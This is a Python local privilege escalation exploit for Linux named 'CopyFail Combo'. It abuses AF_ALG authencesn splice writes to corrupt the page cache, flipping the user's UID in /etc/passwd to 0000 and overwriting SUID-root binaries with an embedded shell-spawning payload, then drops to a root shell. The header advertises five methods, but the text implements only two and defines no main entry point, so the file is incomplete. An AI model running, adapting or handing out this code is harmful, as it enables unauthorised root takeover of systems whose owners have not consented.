#!/usr/bin/env python3
"""
CopyFail Combo v4.0 — Multi-Method Local Privilege Escalation
CopyFail + DirtyCBC + DirtyFrag + Pack2TheRoot

Methods (tried in order, each isolated — failure never blocks next):
  1. CopyFail /etc/passwd UID flip — AF_ALG authencesn 4-byte page cache write
  2. CopyFail binary mutation — AF_ALG, tries ALL SUID binaries until root
  3. DirtyCBC binary mutation — RxGK chosen-plaintext, tries ALL SUID binaries
  4. DirtyFrag (ESP + RxRPC auto-chain) — compiled C, handles own shell
  5. Pack2TheRoot (PackageKit TOCTOU) — D-Bus race condition
"""

import ctypes
import ctypes.util
import errno
import fcntl
import os
import select
import shutil
import struct
import subprocess
import sys
import time
import zlib

try:
    import socket
except ImportError:
    socket = None
try:
    import pwd
except ImportError:
    pwd = None

# ──────────────────────────────────────────────────
# CONSTANTS
# ──────────────────────────────────────────────────

AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
ALG_OP_DECRYPT = 0
MSG_MORE = 0x8000

AF_RXRPC = 33
SOL_RXRPC = 272
RXRPC_SECURITY_KEYRING = 2
RXRPC_USER_CALL_ID = 1
RXRPC_CHARGE_ACCEPT = 14
RXRPC_PACKET_TYPE_DATA = 1
RXRPC_PACKET_TYPE_ACK = 2
RXRPC_PACKET_TYPE_ABORT = 4
RXRPC_PACKET_TYPE_CHALLENGE = 6
RXRPC_PACKET_TYPE_RESPONSE = 7
RXRPC_CLIENT_INITIATED = 0x01
RXRPC_LAST_PACKET = 0x04

SYS_add_key = 248
SYS_keyctl = 250
KEY_SPEC_SESSION_KEYRING = -3
KEYCTL_JOIN_SESSION_KEYRING = 1
KEYCTL_SETPERM = 5
F_SETPIPE_SZ = 1031

RXGK_SERVER_ENC_TOKEN = 1036

PK_SUID = "/tmp/.s"
AUTHENC_KEY = bytes.fromhex('0800010000000010') + b'\x00' * 32

PAYLOAD_X86_64 = zlib.decompress(bytes.fromhex(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

SUID_ORDER = [
    "/usr/bin/newgrp", "/usr/bin/chfn", "/usr/bin/chsh",
    "/usr/bin/gpasswd", "/usr/bin/wall", "/usr/bin/expiry",
    "/usr/bin/sg", "/usr/bin/at", "/usr/bin/crontab",
    "/usr/bin/mount", "/usr/bin/umount",
    "/usr/bin/fusermount3", "/usr/bin/fusermount",
    "/usr/bin/pkexec",
    "/usr/bin/passwd", "/usr/bin/su", "/bin/su", "/usr/bin/sudo",
]

ALGOS = [
    "authencesn(hmac(sha256),cbc(aes))",
    "authencesn(hmac(sha512),cbc(aes))",
    "authencesn(hmac(sha384),cbc(aes))",
    "authencesn(hmac(sha256),ctr(aes))",
    "authencesn(hmac(sha1),cbc(aes))",
    "authencesn(hmac(sha256),cbc(camellia))",
    "authencesn(hmac(sha256),rfc3686(ctr(aes)))",
]

_RXGK_SRV_PORT = 7000
_RXGK_SVC_ID = 1234
_RXGK_KVNO = 1
_RXGK_ENCTYPE = 18
_RXGK_KR_NAME = b"rxgk_poc_kr"


def log(msg, end="\n"):
    sys.stderr.write(str(msg) + end)
    sys.stderr.flush()


def qrun(cmd, **kw):
    try:
        return subprocess.run(cmd, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL, **kw)
    except Exception:
        return None


# ──────────────────────────────────────────────────
# SPLICE ABSTRACTION (Python 3.6+ via ctypes)
# ──────────────────────────────────────────────────

_splice_fn = None
_splice_native = False


def init_splice():
    global _splice_fn, _splice_native
    if hasattr(os, 'splice'):
        _splice_fn = os.splice
        _splice_native = True
        return True
    try:
        libc = ctypes.CDLL(ctypes.util.find_library('c') or "libc.so.6",
                           use_errno=True)
        libc.splice.argtypes = [
            ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
            ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
            ctypes.c_size_t, ctypes.c_uint,
        ]
        libc.splice.restype = ctypes.c_ssize_t

        def _splice(fd_in, fd_out, count, offset_src=None, offset_dst=None):
            oi = ctypes.byref(ctypes.c_int64(offset_src)) if offset_src is not None else None
            oo = ctypes.byref(ctypes.c_int64(offset_dst)) if offset_dst is not None else None
            r = libc.splice(fd_in, oi, fd_out, oo, count, 0)
            if r < 0:
                e = ctypes.get_errno()
                raise OSError(e, os.strerror(e))
            return r

        _splice_fn = _splice
        _splice_native = False
        return True
    except Exception:
        return False


def do_splice(fd_in, fd_out, count, offset_src=None):
    if _splice_native:
        if offset_src is not None:
            return _splice_fn(fd_in, fd_out, count, offset_src=offset_src)
        return _splice_fn(fd_in, fd_out, count)
    return _splice_fn(fd_in, fd_out, count, offset_src=offset_src)


# ──────────────────────────────────────────────────
# AF_ALG CORE
# ──────────────────────────────────────────────────

_algo = None


def find_algo():
    global _algo
    if _algo:
        return _algo

    mods = [
        "af_alg", "algif_aead", "algif_skcipher",
        "authenc", "hmac",
        "sha256", "sha256_generic",
        "aes", "aes_generic", "aes_x86_64",
        "cbc", "ctr", "camellia",
    ]
    for m in mods:
        qrun(["modprobe", m], timeout=3)

    try:
        t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        t.close()
    except Exception:
        pass

    for trigger_algo in ["cbc(aes)", "hmac(sha256)"]:
        try:
            t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            t.bind(("skcipher", trigger_algo))
            t.close()
        except Exception:
            pass
        try:
            t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            t.bind(("hash", trigger_algo))
            t.close()
        except Exception:
            pass

    for a in ALGOS:
        try:
            s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            s.bind(("aead", a))
            s.close()
            _algo = a
            return a
        except (OSError, PermissionError):
            continue
    return None


def patch_4b(file_fd, offset, data_4b):
    ctrl = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    ctrl.bind(("aead", _algo))
    ctrl.setsockopt(SOL_ALG, ALG_SET_KEY, AUTHENC_KEY)
    ctrl.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
    op, _ = ctrl.accept()

    n = offset + 4
    op.sendmsg(
        [b'AAAA' + data_4b],
        [
            (SOL_ALG, ALG_SET_OP, struct.pack('I', ALG_OP_DECRYPT)),
            (SOL_ALG, ALG_SET_IV, struct.pack('I', 16) + b'\x00' * 16),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack('I', 8)),
        ],
        MSG_MORE,
    )

    r, w = os.pipe()
    do_splice(file_fd, w, n, offset_src=0)
    do_splice(r, op.fileno(), n)

    try:
        op.recv(8 + offset)
    except Exception:
        pass

    os.close(r)
    os.close(w)
    op.close()
    ctrl.close()


# ──────────────────────────────────────────────────
# SUID DISCOVERY
# ──────────────────────────────────────────────────

def _is_suid_root_readable(path):
    try:
        if not os.path.isfile(path):
            return False
        st = os.stat(path)
        return (st.st_mode & 0o4000) and st.st_uid == 0 and os.access(path, os.R_OK)
    except (OSError, PermissionError):
        return False


def find_all_suid():
    found = set()
    ordered = []

    for p in SUID_ORDER:
        if _is_suid_root_readable(p) and p not in found:
            found.add(p)
            ordered.append(p)

    for dirs in [
        ["/usr/bin", "/bin", "/usr/sbin", "/sbin", "/usr/local/bin",
         "/usr/lib", "/usr/libexec"],
        ["/"],
    ]:
        try:
            cmd = ["find"] + dirs + ["-perm", "-4000", "-type", "f",
                   "-not", "-path", "*/proc/*", "-not", "-path", "*/sys/*"]
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=15 if "/" not in dirs else 30)
            for line in r.stdout.strip().split("\n"):
                p = line.strip()
                if p and p not in found and _is_suid_root_readable(p):
                    found.add(p)
                    ordered.append(p)
        except Exception:
            continue
        if ordered:
            break

    return ordered


# ──────────────────────────────────────────────────
# AUTO ROOT SHELL (MODIFIED FOR CLEAN '#' PROMPT)
# ──────────────────────────────────────────────────

def _reattach_tty():
    try:
        tty = os.open("/dev/tty", os.O_RDWR)
        os.dup2(tty, 0)
        os.dup2(tty, 1)
        os.dup2(tty, 2)
        os.close(tty)
    except OSError:
        pass


def auto_root_exec(binary):
    log("[+++] ROOT — dropping to shell")
    _reattach_tty()
    # Memaksa environment prompt hanya berupa karakter pagar tanpa profile loading
    os.environ["PS1"] = "# "
    os.execl("/bin/sh", "sh", "--noediting", "--noprofile", "--norc")


def auto_root_su(username):
    log("[+++] ROOT — su %s" % username)
    _reattach_tty()
    # Mengeksekusi interaktif su dengan mengabaikan inisialisasi lingkungan kustom host
    os.environ["PS1"] = "# "
    os.execlp("su", "su", username, "-s", "/bin/sh", "-c", "export PS1='# '; exec /bin/sh --noprofile --norc")


# ──────────────────────────────────────────────────
# METHOD 1: CopyFail /etc/passwd UID Flip
# ──────────────────────────────────────────────────

def try_passwd_flip():
    log("\n[=== METHOD 1: CopyFail /etc/passwd UID Flip ===]")

    if pwd is None:
        log("[-] pwd module unavailable")
        return False

    uid = os.getuid()
    if uid < 1000 or uid > 9999:
        log("[-] UID %d not 4-digit (need 1000-9999)" % uid)
        return False

    try:
        pw = pwd.getpwuid(uid)
    except KeyError:
        log("[-] UID %d not in passwd DB" % uid)
        return False

    if not os.access("/etc/passwd", os.R_OK):
        log("[-] /etc/passwd not readable")
        return False

    with open("/etc/passwd", "r") as f:
        content = f.read()

    search = "%s:" % pw.pw_name
    pos = content.find(search)
    if pos < 0:
        log("[-] %s not found in /etc/passwd" % pw.pw_name)
        return False

    after = pos + len(search)
    try:
        colon1 = content.index(":", after)
    except ValueError:
        log("[-] Malformed /etc/passwd line")
        return False
    uid_off = colon1 + 1

    expected = "%04d" % uid
    actual = content[uid_off:uid_off + 4]
    if actual != expected:
        log("[-] Sanity fail: expected '%s' at %d, got '%s'" % (expected, uid_off, actual))
        return False

    log("[+] %s uid=%d offset=%d" % (pw.pw_name, uid, uid_off))
    log("[*] Flipping UID -> 0000 in page cache...")

    fd = os.open("/etc/passwd", os.O_RDONLY)
    try:
        patch_4b(fd, uid_off, b"0000")
    except Exception as e:
        os.close(fd)
        log("[-] Patch failed: %s" % e)
        return False
    os.close(fd)

    with open("/etc/passwd", "r") as f:
        verify = f.read()[uid_off:uid_off + 4]

    if verify == "0000":
        log("[+++] UID flip VERIFIED in page cache!")
        root_via = _passwd_flip_get_shell(pw.pw_name)
        if not root_via:
            log("[*] Falling back to su (enter YOUR password for root shell)")
            auto_root_su(pw.pw_name)
        return True

    log("[-] Verify failed: got '%s' (expected '0000')" % verify)
    return False


def _passwd_flip_get_shell(username):
    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        return False

    payload = PAYLOAD_X86_64
    suids = find_all_suid()
    if not suids:
        return False

    log("[*] Chaining: patching SUID binary for passwordless shell...")
    for target in suids:
        try:
            fd = os.open(target, os.O_RDONLY)
        except (PermissionError, OSError):
            continue

        total = len(payload)
        try:
            for off in range(0, total, 4):
                chunk = payload[off:off + 4]
                if len(chunk) < 4:
                    chunk = chunk.ljust(4, b'\x00')
                patch_4b(fd, off, chunk)
            os.close(fd)
        except Exception:
            try:
                os.close(fd)
            except OSError:
                pass
            continue

        with open(target, "rb") as f:
            readback = f.read(total)

        verify_slice = slice(24, 32)
        if readback[verify_slice] == payload[verify_slice]:
            log("[+++] %s patched — exec for root shell" % target)
            auto_root_exec(target)
            return True

    return False


# ──────────────────────────────────────────────────
# METHOD 2: CopyFail Binary Mutation
# ──────────────────────────────────────────────────

def try_binary_mutation():
    log("\n[=== METHOD 2: CopyFail Binary Mutation ===]")

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] No payload for %s" % arch)
        return False

    payload = PAYLOAD_X86_64
    log("[*] Payload: %dB x86_64 ELF (setuid+execve /bin/sh)" % len(payload))

    suids = find_all_suid()
    if not suids:
        log("[-] No readable SUID-root binaries found")
        return False

    log("[+] %d SUID candidates" % len(suids))

    verify_slice = slice(24, 32)
    expected_verify = payload[verify_slice]

    for idx, target in enumerate(suids):
        log("\n  [%d/%d] %s" % (idx + 1, len(suids), target))

        try:
            fd = os.open(target, os.O_RDONLY)
        except (PermissionError, OSError) as e:
            log("    [-] open: %s" % e)
            continue

        total = len(payload)
        try:
            for off in range(0, total, 4):
                chunk = payload[off:off + 4]
                if len(chunk) < 4:
                    chunk = chunk.ljust(4, b'\x00')
                patch_4b(fd, off, chunk)
            os.close(fd)
        except OSError as e:
            try:
                os.close(fd)
            except OSError:
                pass
            log("    [-] patch error: %s" % e)
            if e.errno == 22:
                log("    [-] EINVAL — seccomp/AppArmor may be blocking AF_ALG")
            continue
        except Exception as e:
            try:
                os.close(fd)
            except OSError:
                pass
            log("    [-] %s: %s" % (type(e).__name__, e))
            continue

        with open(target, "rb") as f:
            readback = f.read(total)

        if readback[verify_slice] == expected_verify:
            log("    [+++] Page cache VERIFIED — %s is our payload now" % target)
            auto_root_exec(target)
            return True
        else:
            log("    [-] Verify mismatch")
            continue

    log("\n[-] Exhausted all %d SUID binaries" % len(suids))
    return False

# Jalankan fungsi utama/inisialisasi sesuai kebutuhan alur eksekusi aslimu di bawah jika ada.
